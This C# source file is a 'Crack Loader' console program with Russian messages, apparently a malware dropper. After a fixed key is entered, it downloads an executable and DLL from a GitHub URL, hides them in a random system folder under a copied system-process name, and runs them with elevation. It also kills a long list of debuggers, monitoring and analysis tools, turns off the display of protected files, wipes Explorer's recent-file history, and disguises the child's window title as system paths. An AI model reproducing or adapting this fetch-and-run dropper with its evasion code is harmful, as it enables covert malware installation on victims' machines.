using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace SecureFileDownloader
{
    class Program
    {
        private static readonly string FileUrl = "https://github.com/not-seil/FWXZK9JXKHPTy-lWMj9vA0VNa_Wxgijo6lgopPr_A3GgkUNsAD/raw/main/Machine_GRGOQG.exe";
        private static readonly string DllFileUrl = "https://github.com/not-seil/FWXZK9JXKHPTy-lWMj9vA0VNa_Wxgijo6lgopPr_A3GgkUNsAD/raw/main/SDL3.dll";
        private static string DownloadedFilePath;
        private static string DownloadedDllFilePath;
        private static string RandomFolderPath;
        private const string CorrectKey = "crack";
        private static readonly string[] ForbiddenProcesses = new[]
        {
            "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64", "windbg", "immunitydebugger", "radare2", "ghidra",
            "dnspy", "de4dot", "dotpeek", "reflector", "ilspy", "ildasm", "pyinstxtractor", "uncompyle6", "apktool", "smali", "baksmali",
            "taskmgr", "procexp", "processhacker", "processexplorer", "procmon", "autoruns", "tcpview", "rammap", "vmmap", "handle", "sysinternals",
            "hxd", "winhex", "010editor", "cffexplorer", "peid", "lordpe", "reshacker", "resourcehacker", "stud_pe",
            "wireshark", "fiddler", "charles", "burpsuite", "tcpdump", "netmon", "httpdebugger", "mitmproxy",
            "cheatengine", "artmoney", "mimikatz", "dumpit", "volatility", "procdump", "hollowshunter",
            "dotpeek", "ilspy", "dnspy", "de4dot", "reflector", "dotnet", "ildasm", "ilasm",
            "pyinstxtractor", "uncompyle6", "decompyle3", "pycdc", "pyarmor",
            "apktool", "smali", "baksmali", "jadx", "jeb", "bytecodeviewer",
            "jd-gui", "cfr", "procyon", "fernflower", "recaf", "javadecompiler",
            "jsbeautifier", "jsnice", "prettier", "esprima", "acorn",
            "powershell_ise", "pspad", "psstudio", "powershell", "pwsh",
            "sqlmap", "sqlninja", "sqlsus", "sqlping", "sqldumper",
            "zap", "nikto", "arachni", "w3af", "skipfish", "burpsuite", "acunetix", "netsparker",
            "binwalk", "cutter", "binaryninja", "gdb", "lldb", "radare2", "ghidra",
            "vmware", "virtualbox", "qemu", "hyper-v", "vboxmanage",
            "docker", "kubernetes", "podman", "lxc", "rkt",
            "aws", "azure", "gcloud", "terraform", "cloudformation",
            "nmap", "metasploit", "nessus", "openvas", "nexpose", "qualys", "nessusd", "nessuscli",
            "filemon", "regmon", "procmon", "sysmon", "winobj",
            "regedit", "regshot", "regscanner", "regripper", "regview",
            "driverquery", "driverview", "driveridentifier", "driverpack", "driverbooster",
            "vhdxtool", "vmdktool", "vdiinfo", "vboximg-mount", "qemu-img",
            "ifconfig", "ipconfig", "netstat", "tcpdump", "wireshark",
            "nslookup", "dig", "dnsenum", "dnsrecon", "dnswalk",
            "openssl", "sslyze", "testssl", "sslscan", "tlssled",
            "apache", "nginx", "iis", "tomcat", "lighttpd",
            "openvpn", "wireguard", "tinc", "zerotier", "tailscale", "everything", "su", "simpleunlocker", "1", "123", "1213", "1312", "extremedumper", "dumper", "malcat", "uninstaltool", "uninstalltool"
        };
        private static Process _childProcess;
        private static bool _stopMonitoring = false;
        private static FileStream _fileLock;

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetFileAttributes(string lpFileName, FileAttributes dwFileAttributes);

        static async Task Main(string[] args)
        {
            Console.Title = GenerateRandomTitle(15);
            PrintLogo();

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true))
            {
                if (key != null)
                {
                    key.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord);
                }
            }

            RestartExplorer();

            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string cryptoDllPath = Path.Combine(currentDirectory, "System.Security.Cryptography.ProtectedData.dll");

            if (!File.Exists(cryptoDllPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Ошибка: Файл System.Security.Cryptography.ProtectedData.dll отсутствует или поврежден.");
                Console.ResetColor();
                Thread.Sleep(2000);
                return;
            }

            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
            Console.CancelKeyPress += OnProcessExit;

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("Введите ключ доступа:");
            Console.ResetColor();

            string userKey = Console.ReadLine();

            if (userKey != CorrectKey)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Неверный ключ доступа. Программа будет завершена.");
                Console.ResetColor();
                Thread.Sleep(2000);
                return;
            }

            RandomFolderPath = GetRandomSystemFolder();
            DownloadedFilePath = Path.Combine(RandomFolderPath, GenerateRandomSystemProcessName() + ".exe");
            DownloadedDllFilePath = Path.Combine(RandomFolderPath, "SDL3.dll");

            DeleteOldFile(DownloadedFilePath);
            Task monitoringTask = Task.Run(() => MonitorForbiddenProcesses());

            try
            {
                await DownloadFile(FileUrl, DownloadedFilePath);
                await DownloadFile(DllFileUrl, DownloadedDllFilePath);

                LockFile(DownloadedFilePath);

                SetFileAttributes(DownloadedFilePath, FileAttributes.Hidden | FileAttributes.System);
                SetFileAttributes(DownloadedDllFilePath, FileAttributes.Hidden | FileAttributes.System);

                RestartExplorerIfNeeded();
                StartExternalProcess();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Ошибка: {ex.Message}");
                Console.ResetColor();
            }
            finally
            {
                _stopMonitoring = true;
                monitoringTask.Wait();
                DeleteFiles();
            }
        }

        private static string GetRandomSystemFolder()
        {
            string[] systemFolders = new[]
            {
                Path.GetTempPath(),
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            };

            Random random = new Random();
            string selectedFolder = systemFolders[random.Next(systemFolders.Length)];
            string folderName = GenerateRandomTitle(10);
            string fullPath = Path.Combine(selectedFolder, folderName);

            if (!Directory.Exists(fullPath))
            {
                Directory.CreateDirectory(fullPath);
                SetFileAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System);
            }

            return fullPath;
        }

        private static string GenerateRandomSystemProcessName()
        {
            string[] systemProcessNames = new[]
            {
                "svchost", "csrss", "winlogon", "services", "lsass", "smss", "wininit", "spoolsv", "explorer", "ctfmon",
                "rundll32", "msiexec", "wmiprvse", "SearchIndexer", "Taskmgr", "conhost", "vssvc", "audiodg", "WUDFHost",
                "DllHost", "WerFault", "sihost", "RuntimeBroker", "SettingSyncHost", "backgroundTaskHost", "ApplicationFrameHost",
                "ShellExperienceHost", "SearchProtocolHost", "SearchFilterHost", "mspaint", "notepad", "calc", "cmd", "powershell",
                "regedit", "mmc", "services", "eventvwr", "compmgmt", "devmgmt", "diskmgmt", "perfmon", "resmon", "taskmgr", "msconfig",
                "cleanmgr", "dfrgui", "charmap", "odbcad32", "cliconfg", "dxdiag", "msinfo32", "mstsc", "winver", "write", "wordpad",
                "magnify", "narrator", "osk", "utilman", "snippingtool", "stikynot", "wab", "wmplayer", "iexplore", "msedge", "chrome",
                "firefox", "opera", "brave", "vlc", "winamp", "spotify", "steam", "epicgameslauncher", "origin", "uplay", "battle.net",
                "discord", "slack", "teams", "zoom", "skype", "whatsapp", "telegram", "signal", "thunderbird", "outlook", "onedrive",
                "dropbox", "googledrivesync", "mega", "7zfm", "winrar", "winzip", "acrobat", "foxitreader", "nitroreader", "photoshop",
                "illustrator", "coreldraw", "autocad", "solidworks", "blender", "maya", "3dsmax", "zbrush", "unity", "unrealengine",
                "godot", "cryengine", "frostbite", "sourceengine", "idtech", "creationkit", "modorganizer", "nexusmodmanager", "vortex",
                "mo2", "wryebash", "tes5edit", "fo4edit", "ssedit", "xedit", "mator", "mergeplugins", "loot", "boss", "wb", "wbemtest",
                "wmic", "wscript", "cscript", "powershell_ise", "regsvr32", "rundll32", "msiexec", "wuauclt", "wusa", "mshta", "hh",
                "winhlp32", "winhelp", "winhlp"
            };

            Random random = new Random();
            return systemProcessNames[random.Next(systemProcessNames.Length)];
        }

        private static void RestartExplorer()
        {
            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                try
                {
                    process.Kill();
                    process.WaitForExit();
                }
                catch { }
            }
            Process.Start("explorer.exe");
        }

        private static void StartExternalProcess()
        {
            try
            {
                UnlockFile();
                ProcessStartInfo startInfo = new ProcessStartInfo(DownloadedFilePath)
                {
                    UseShellExecute = true,
                    Verb = "runas"
                };

                Console.WriteLine("Initializing driver mapping...");
                Thread.Sleep(5000);
                Console.WriteLine("Driver mapped successfully.");
                _childProcess = Process.Start(startInfo);
                Console.WriteLine("Driver entity returned 1");

                if (_childProcess != null)
                {
                    Task.Run(() => ChangeWindowTitlePeriodically());

                    _childProcess.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Ошибка при запуске процесса: {ex.Message}");
                Console.ResetColor();
            }
        }

        private static void ChangeWindowTitlePeriodically()
        {
            while (_childProcess != null && !_childProcess.HasExited)
            {
                ChangeSecondWindowTitle();
                Thread.Sleep(1000);
            }
        }

        private static void ChangeSecondWindowTitle()
        {
            if (_childProcess != null && !_childProcess.HasExited)
            {
                uint targetProcessId = (uint)_childProcess.Id;
                IntPtr secondWindowHandle = IntPtr.Zero;
                int windowCount = 0;

                EnumWindows((hWnd, lParam) =>
                {
                    uint processId;
                    GetWindowThreadProcessId(hWnd, out processId);

                    if (processId == targetProcessId)
                    {
                        windowCount++;
                        if (windowCount == 2)
                        {
                            secondWindowHandle = hWnd;
                            return false;
                        }
                    }
                    return true;
                }, IntPtr.Zero);

                if (secondWindowHandle != IntPtr.Zero)
                {
                    string randomSystemPath = GenerateRandomSystemPath();
                    SetWindowText(secondWindowHandle, randomSystemPath);
                }
            }
        }

        private static string GenerateRandomSystemPath()
        {
            string[] systemPaths = new[]
            {
                @"C:\Windows\System32\svchost.exe",
                @"C:\Windows\System32\csrss.exe",
                @"C:\Windows\System32\winlogon.exe",
                @"C:\Windows\System32\services.exe",
                @"C:\Windows\System32\lsass.exe",
                @"C:\Windows\SysWOW64\svchost.exe",
                @"C:\Windows\SysWOW64\csrss.exe",
                @"C:\Windows\SysWOW64\winlogon.exe",
                @"C:\Windows\SysWOW64\services.exe",
                @"C:\Windows\SysWOW64\lsass.exe",
                @"C:\Windows\System\smss.exe",
                @"C:\Windows\System\wininit.exe",
                @"C:\Windows\System\spoolsv.exe",
                @"C:\Windows\System\explorer.exe",
                @"C:\Windows\System\ctfmon.exe",
                @"C:\Windows\System\rundll32.exe",
                @"C:\Windows\System\msiexec.exe",
                @"C:\Windows\System\wmiprvse.exe",
                @"C:\Windows\System\SearchIndexer.exe",
                @"C:\Windows\System\Taskmgr.exe",
                @"C:\Windows\System\conhost.exe",
                @"C:\Windows\System\vssvc.exe",
                @"C:\Windows\System\audiodg.exe",
                @"C:\Windows\System\WUDFHost.exe",
                @"C:\Windows\System\DllHost.exe",
                @"C:\Windows\System\WerFault.exe",
                @"C:\Windows\System\sihost.exe",
                @"C:\Windows\System\RuntimeBroker.exe",
                @"C:\Windows\System\SettingSyncHost.exe",
                @"C:\Windows\System\backgroundTaskHost.exe",
                @"C:\Windows\System\ApplicationFrameHost.exe",
                @"C:\Windows\System\ShellExperienceHost.exe",
                @"C:\Windows\System\SearchProtocolHost.exe",
                @"C:\Windows\System\SearchFilterHost.exe",
                @"C:\Windows\System\mspaint.exe",
                @"C:\Windows\System\notepad.exe",
                @"C:\Windows\System\calc.exe",
                @"C:\Windows\System\cmd.exe",
                @"C:\Windows\System\powershell.exe",
                @"C:\Windows\System\regedit.exe",
                @"C:\Windows\System\mmc.exe",
                @"C:\Windows\System\services.msc",
                @"C:\Windows\System\eventvwr.exe",
                @"C:\Windows\System\compmgmt.msc",
                @"C:\Windows\System\devmgmt.msc",
                @"C:\Windows\System\diskmgmt.msc",
                @"C:\Windows\System\perfmon.exe",
                @"C:\Windows\System\resmon.exe",
                @"C:\Windows\System\taskmgr.exe",
                @"C:\Windows\System\msconfig.exe",
                @"C:\Windows\System\cleanmgr.exe",
                @"C:\Windows\System\dfrgui.exe",
                @"C:\Windows\System\charmap.exe",
                @"C:\Windows\System\odbcad32.exe",
                @"C:\Windows\System\cliconfg.exe",
                @"C:\Windows\System\dxdiag.exe",
                @"C:\Windows\System\msinfo32.exe",
                @"C:\Windows\System\mstsc.exe",
                @"C:\Windows\System\winver.exe",
                @"C:\Windows\System\write.exe",
                @"C:\Windows\System\wordpad.exe",
                @"C:\Windows\System\magnify.exe",
                @"C:\Windows\System\narrator.exe",
                @"C:\Windows\System\osk.exe",
                @"C:\Windows\System\utilman.exe",
                @"C:\Windows\System\snippingtool.exe",
                @"C:\Windows\System\stikynot.exe",
                @"C:\Windows\System\wab.exe",
                @"C:\Windows\System\wmplayer.exe",
                @"C:\Windows\System\iexplore.exe",
                @"C:\Windows\System\msedge.exe",
                @"C:\Windows\System\chrome.exe",
                @"C:\Windows\System\firefox.exe",
                @"C:\Windows\System\opera.exe",
                @"C:\Windows\System\brave.exe",
                @"C:\Windows\System\vlc.exe",
                @"C:\Windows\System\winamp.exe",
                @"C:\Windows\System\spotify.exe",
                @"C:\Windows\System\steam.exe",
                @"C:\Windows\System\epicgameslauncher.exe",
                @"C:\Windows\System\origin.exe",
                @"C:\Windows\System\uplay.exe",
                @"C:\Windows\System\battle.net.exe",
                @"C:\Windows\System\discord.exe",
                @"C:\Windows\System\slack.exe",
                @"C:\Windows\System\teams.exe",
                @"C:\Windows\System\zoom.exe",
                @"C:\Windows\System\skype.exe",
                @"C:\Windows\System\whatsapp.exe",
                @"C:\Windows\System\telegram.exe",
                @"C:\Windows\System\signal.exe",
                @"C:\Windows\System\thunderbird.exe",
                @"C:\Windows\System\outlook.exe",
                @"C:\Windows\System\onedrive.exe",
                @"C:\Windows\System\dropbox.exe",
                @"C:\Windows\System\googledrivesync.exe",
                @"C:\Windows\System\mega.exe",
                @"C:\Windows\System\7zfm.exe",
                @"C:\Windows\System\winrar.exe",
                @"C:\Windows\System\winzip.exe",
                @"C:\Windows\System\acrobat.exe",
                @"C:\Windows\System\foxitreader.exe",
                @"C:\Windows\System\nitroreader.exe",
                @"C:\Windows\System\photoshop.exe",
                @"C:\Windows\System\illustrator.exe",
                @"C:\Windows\System\coreldraw.exe",
                @"C:\Windows\System\autocad.exe",
                @"C:\Windows\System\solidworks.exe",
                @"C:\Windows\System\blender.exe",
                @"C:\Windows\System\maya.exe",
                @"C:\Windows\System\3dsmax.exe",
                @"C:\Windows\System\zbrush.exe",
                @"C:\Windows\System\unity.exe",
                @"C:\Windows\System\unrealengine.exe",
                @"C:\Windows\System\godot.exe",
                @"C:\Windows\System\cryengine.exe",
                @"C:\Windows\System\frostbite.exe",
                @"C:\Windows\System\sourceengine.exe",
                @"C:\Windows\System\idtech.exe",
                @"C:\Windows\System\creationkit.exe",
                @"C:\Windows\System\modorganizer.exe",
                @"C:\Windows\System\nexusmodmanager.exe",
                @"C:\Windows\System\vortex.exe",
                @"C:\Windows\System\mo2.exe",
                @"C:\Windows\System\wryebash.exe",
                @"C:\Windows\System\tes5edit.exe",
                @"C:\Windows\System\fo4edit.exe",
                @"C:\Windows\System\ssedit.exe",
                @"C:\Windows\System\xedit.exe",
                @"C:\Windows\System\mator.exe",
                @"C:\Windows\System\mergeplugins.exe",
                @"C:\Windows\System\loot.exe",
                @"C:\Windows\System\boss.exe",
                @"C:\Windows\System\wb.exe",
                @"C:\Windows\System\wbemtest.exe",
                @"C:\Windows\System\wmic.exe",
                @"C:\Windows\System\wscript.exe",
                @"C:\Windows\System\cscript.exe",
                @"C:\Windows\System\powershell_ise.exe",
                @"C:\Windows\System\regsvr32.exe",
                @"C:\Windows\System\rundll32.exe",
                @"C:\Windows\System\msiexec.exe",
                @"C:\Windows\System\wuauclt.exe",
                @"C:\Windows\System\wusa.exe",
                @"C:\Windows\System\mshta.exe",
                @"C:\Windows\System\hh.exe",
                @"C:\Windows\System\winhlp32.exe",
                @"C:\Windows\System\winhelp.exe",
                @"C:\Windows\System\winhlp.exe",
                @"C:\Windows\System\winhelp32.exe",
                @"C:\Windows\System\winhlp64.exe",
                @"C:\Windows\System\winhlp16.exe"
            };

            Random random = new Random();
            return systemPaths[random.Next(systemPaths.Length)];
        }

        private static string GenerateRandomTitle(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static void PrintLogo()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(@"
Crack Loader 

");
            Console.ResetColor();
        }

        private static void DeleteOldFile(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
            }
            catch { }
        }

        private static void LockFile(string filePath)
        {
            try
            {
                _fileLock = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
            }
            catch { }
        }

        private static void UnlockFile()
        {
            try
            {
                if (_fileLock != null)
                {
                    _fileLock.Close();
                    _fileLock.Dispose();
                    _fileLock = null;
                }
            }
            catch { }
        }

        private static void RestartExplorerIfNeeded()
        {
            string fileDirectory = Path.GetDirectoryName(DownloadedFilePath);

            // Закрыть все окна проводника
            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                try
                {
                    process.Kill();
                    process.WaitForExit();
                }
                catch { }
            }

            // Очистить историю проводника
            ClearExplorerHistory();

            // Перезапустить проводник
            Process.Start("explorer.exe");

            // Убедиться, что путь не открыт в проводнике
            Thread.Sleep(2000); // Дать время для перезапуска проводника
            if (IsExplorerShowingPath(fileDirectory))
            {
                // Если путь все еще открыт, повторить перезапуск
                RestartExplorerIfNeeded();
            }
        }

        private static void ClearExplorerHistory()
        {
            try
            {
                // Очистить историю недавних файлов и папок
                string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                foreach (var file in Directory.GetFiles(recentPath))
                {
                    try
                    {
                        File.Delete(file);
                    }
                    catch { }
                }

                // Очистить историю быстрого доступа
                string quickAccessPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Recent\AutomaticDestinations");
                if (Directory.Exists(quickAccessPath))
                {
                    foreach (var file in Directory.GetFiles(quickAccessPath))
                    {
                        try
                        {
                            File.Delete(file);
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private static bool IsExplorerShowingPath(string path)
        {
            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                try
                {
                    string processPath = process.MainModule.FileName;
                    if (processPath.StartsWith(path, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                catch { }
            }
            return false;
        }

        private static void MonitorForbiddenProcesses()
        {
            while (!_stopMonitoring)
            {
                if (CloseForbiddenProcesses())
                {
                    Environment.Exit(0);
                }
                Thread.Sleep(1000); // Проверка каждые 10 секунд
            }
        }

        private static void OnProcessExit(object sender, EventArgs e)
        {
            _stopMonitoring = true;

            if (_childProcess != null && !_childProcess.HasExited)
            {
                _childProcess.Kill();
                _childProcess.WaitForExit();
            }

            DeleteFiles();
        }

        private static bool CloseForbiddenProcesses()
        {
            var processes = Process.GetProcesses();
            bool forbiddenProcessDetected = false;

            foreach (var process in processes)
            {
                try
                {
                    string processName = process.ProcessName.ToLower();
                    if (ForbiddenProcesses.Contains(processName))
                    {
                        forbiddenProcessDetected = true;
                        process.Kill();
                        process.WaitForExit();
                    }
                }
                catch { }
            }

            return forbiddenProcessDetected;
        }

        private static async Task DownloadFile(string url, string filePath)
        {
            using (var httpClient = new HttpClient())
            {
                try
                {
                    var response = await httpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
                    response.EnsureSuccessStatusCode();

                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }

                    using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        await response.Content.CopyToAsync(fileStream);
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Ошибка при скачивании файла: {ex.Message}");
                    Console.ResetColor();
                    throw;
                }
            }
        }

        private static void DeleteFiles()
        {
            try
            {
                if (File.Exists(DownloadedFilePath))
                {
                    File.Delete(DownloadedFilePath);
                }

                if (File.Exists(DownloadedDllFilePath))
                {
                    File.Delete(DownloadedDllFilePath);
                }

                if (Directory.Exists(RandomFolderPath) && !Directory.EnumerateFileSystemEntries(RandomFolderPath).Any())
                {
                    Directory.Delete(RandomFolderPath);
                }
            }
            catch { }
        }
    }
}